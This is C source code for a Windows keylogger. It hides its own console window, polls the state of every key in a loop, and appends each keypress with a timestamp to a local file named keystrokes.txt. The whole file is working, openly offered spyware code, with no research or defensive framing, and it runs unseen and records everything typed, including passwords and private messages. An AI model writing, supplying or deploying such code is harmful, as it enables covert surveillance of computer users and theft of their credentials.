#include <stdio.h>
#include <windows.h>
#include <ctype.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>

#define LOG_FILE "keystrokes.txt"
#define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
#define MAX_TIMESTAMP_LENGTH 20
#define NUM_KEYS 256
#define MAX_KEY_NAME_LENGTH 32 // Define a maximum length for key names

// Function to get the current timestamp
bool get_timestamp(char *timestamp, size_t timestamp_size) {
    time_t rawtime;
    struct tm timeinfo;
    errno_t err;

    time(&rawtime);
    err = localtime_s(&timeinfo, &rawtime);

    if (err != 0) {
        fprintf(stderr, "Error: localtime_s failed with error code %d.\n", err);
        timestamp[0] = '\0';
        return false;
    }

    if (strftime(timestamp, timestamp_size, TIMESTAMP_FORMAT, &timeinfo) == 0) {
        fprintf(stderr, "Error: Timestamp buffer too small.\n");
        timestamp[0] = '\0';
        return false;
    }
    return true;
}

// Function to get the name of a virtual key code
const char* get_key_name(int key) {
    static char key_name[MAX_KEY_NAME_LENGTH];
    UINT scan_code = MapVirtualKey(key, MAPVK_VK_TO_VSC);

    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_TAB: return "\t";
        case VK_BACK: return "[BACKSPACE]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESCAPE]";
        default:
            if (isprint(key)) {
                snprintf(key_name, MAX_KEY_NAME_LENGTH, "%c", (char)key);
                return key_name;
            } else {
                // Try to get the key name using GetKeyNameText
                if (GetKeyNameText(scan_code << 16, key_name, MAX_KEY_NAME_LENGTH) > 0) {
                    return key_name;
                } else {
                    snprintf(key_name, MAX_KEY_NAME_LENGTH, "[KEY:%d]", key);
                    return key_name;
                }
            }
    }
}


bool log_keystroke(int key) {
    FILE *file;
    errno_t err = fopen_s(&file, LOG_FILE, "a");
    if (err != 0 || file == NULL) {
        fprintf(stderr, "Error opening %s: %s\n", LOG_FILE, strerror(err));
        return false;
    }

    char timestamp[MAX_TIMESTAMP_LENGTH];
    if (!get_timestamp(timestamp, sizeof(timestamp))) {
        fclose(file);
        return false;
    }

    fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));


    if (fclose(file) == EOF) {
        perror("Error closing keystrokes.txt");
        return false;
    }
    return true;
}

int main() {
    int key;
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    bool key_pressed[NUM_KEYS] = {false};

    while (1) {
        for (key = 1; key < NUM_KEYS; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!key_pressed[key]) {
                    if (!log_keystroke(key)) {
                        fprintf(stderr, "Error logging keystroke for key %d\n", key);
                    }
                    key_pressed[key] = true;
                }
            } else {
                key_pressed[key] = false;
            }
        }
        Sleep(1);
    }
    return 0;
}